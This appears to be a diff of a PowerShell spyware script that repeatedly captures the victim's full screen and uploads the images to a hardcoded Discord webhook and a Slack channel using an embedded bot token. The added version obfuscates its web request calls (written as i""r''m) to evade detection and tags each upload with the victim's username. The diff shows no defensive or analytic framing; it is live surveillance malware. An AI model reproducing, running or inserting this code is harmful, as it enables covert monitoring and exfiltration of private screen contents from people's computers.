@@ -2,92 +2,80 @@ $dwbt='https://discord.com/api/webhooks/10779346' + '36958744617/zh07WaxN4jLLI1Z
 $swbt='https://hooks.slack.com/services/T08F0' + '53J6G5/B08FXT4AHU0/MhBJ6ZQkjW5dzKwDi6yow9FB'
 $sat = "xoxb-8510173618549-855156999" + "8048-9VGiG8Blv8C7OABqVo9xP9m5"
 
-Add-Type -AssemblyName WindowsBase
-Add-Type -AssemblyName PresentationCore
-Add-Type @'
-using System;
-using System.Runtime.InteropServices;
-using System.Drawing;
+while(1){
 
-public class DPI {
-  [DllImport("gdi32.dll")]
-  static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
+  Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
-  public enum DeviceCap {
-  VERTRES = 10,
-  DESKTOPVERTRES = 117
+  $screens = [Windows.Forms.Screen]::AllScreens
+
+  $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
+  $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
+  $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
+  $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
+
+  $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
+  $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
+  $graphics = [Drawing.Graphics]::FromImage($bmp)
+
+  $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+
+  $bmp.Save("$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png")
+  $graphics.Dispose()
+  $bmp.Dispose()
+  
+  start-sleep -Seconds 15
+ "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png" | DropBox-Upload
+
+ try { $ffp = Join-Path -Path $env:USERPROFILE -ChildPath 'AppData\Local\Temp\$env:computername-Capture.png' } catch {}
+  if (Test-Path $ffp) {
+      $uu = $env:USERNAME
+      try { $fb = [System.IO.File]::ReadAllBytes($ffp) } catch { continue }
+      $bd = [System.Guid]::NewGuid().ToString()
+      $lf = "`r`n"
+      $pt1 = @{
+          "username" = $uu
+          "content"  = "`**Found screenshot:`** $ffp"
+      } | ConvertTo-Json -Compress
+      $q1t = (
+          "--$bd",
+          "Content-Disposition: form-data; name=`"payload_json`"",
+          "Content-Type: application/json",
+          "",
+          $pt1,
+          "--$bd",
+          "Content-Disposition: form-data; name=`"file`"; filename=`"$(Split-Path -Leaf $ffp)`"",
+          "Content-Type: application/octet-stream",
+          "",
+          [System.Text.Encoding]::UTF8.GetString($fb),
+          "--$bd--"
+      ) -join $lf
+      $hh = @{
+          "Content-Type" = "multipart/form-data; boundary=$bd"
+      }
+      i""r''m -Uri $dwbt -Method Post -Headers $hh -Body $q1t > $null
+  
+      $st1 = "https://slack.com/api/files.getUploadURLExternal?filename=" + $(Split-Path -Leaf $ffp) + "&length=" + $fb.Length
+      $sh = @{
+          "Authorization" = "Bearer $sat"
+          "Content-Type"  = "application/x-www-form-urlencoded"
+      }
+      $luur = i""r''m -Uri $st1 -Method Get -Headers $sh
+      if ($luur.upload_url) {
+          $suh = @{
+              "Content-Type" = "application/octet-stream"
+          }
+          i""r''m -Uri $luur.upload_url -Method Post -Headers $suh -Body $fb > $null
+          $scu = "https://slack.com/api/files.completeUploadExternal"
+          $scb = @{
+              "files" = @(@{ "id" = $luur.file_id; "title" = "$(Split-Path -Leaf $ffp)" })
+              "channel_id" = "C08F8RJ84P5"
+              "initial_comment"  = "`*Found screenshot:`* $ffp"
+          } | ConvertTo-Json -Compress
+          $sh = @{
+              "Authorization" = "Bearer $sat"
+              "Content-Type"  = "application/json"
+          }
+          i""r''m -Uri $scu -Method Post -Headers $sh -Body $scb > $null 
+      }
   }
-
-  public static float scaling() {
-  Graphics g = Graphics.FromHwnd(IntPtr.Zero);
-  IntPtr desktop = g.GetHdc();
-  int LogicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.VERTRES);
-  int PhysicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.DESKTOPVERTRES);
-
-  return (float)PhysicalScreenHeight / (float)LogicalScreenHeight;
-  }
-}
-'@ -ReferencedAssemblies 'System.Drawing.dll' -ErrorAction Stop
-
-
-while ($true) {
-    # Add necessary types
-    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-
-    # Get virtual screen information
-    $s = [System.Windows.Forms.SystemInformation]::VirtualScreen
-
-    # Create a bitmap of the virtual screen size
-    $b = New-Object System.Drawing.Bitmap ([int32]([math]::round($($s.Width * [DPI]::scaling()), 0))),([int32]([math]::round($($s.Height * [DPI]::scaling()), 0)));
-    [System.Drawing.Graphics]::FromImage($b).CopyFromScreen($s.Left, $s.Top, 0, 0, $b.Size)
-
-    # Save bitmap to a memory stream in PNG format
-    $m = New-Object System.IO.MemoryStream
-    $b.Save($m, [System.Drawing.Imaging.ImageFormat]::Png)
-    $f = $m.ToArray()
-
-    # Set up the multipart form-data
-    $boundary = [System.Guid]::NewGuid().ToString()
-    $lf = "`r`n"
-    $fileName = "$env:COMPUTERNAME-$(Get-Date -Format HHmmss).png"
-    
-    $body = @"
---$boundary
-Content-Disposition: form-data; name="file"; filename="$fileName"
-Content-Type: image/png
-
-$f
---$boundary--
-"@
-    # Convert the body to byte array
-    $bB = [System.Text.Encoding]::UTF8.GetBytes($body)
-
-    $pt1 = @{
-        "username" = "aa"
-        "content"  = "tt"
-    } | ConvertTo-Json -Compress
-    $q1t = (
-        "--$boundary",
-        "Content-Disposition: form-data; name=`"payload_json`"",
-        "Content-Type: application/json",
-        "",
-        $pt1,
-        "--$boundary",
-        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
-        "Content-Type: application/octet-stream",
-        "",
-        [System.Text.Encoding]::UTF8.GetString($f),
-        "--$boundary--"
-    ) -join $lf
-
-    # Set the headers
-    $headers = @{
-        "Content-Type" = "multipart/form-data; boundary=$boundary"
-    }
-
-    # Send the HTTP request
-    irm -Uri $dwbt -Method Post -Headers $headers -Body $q1t
-
-    # Wait for 10 seconds before the next iteration
-    Start-Sleep -Seconds 10
 }
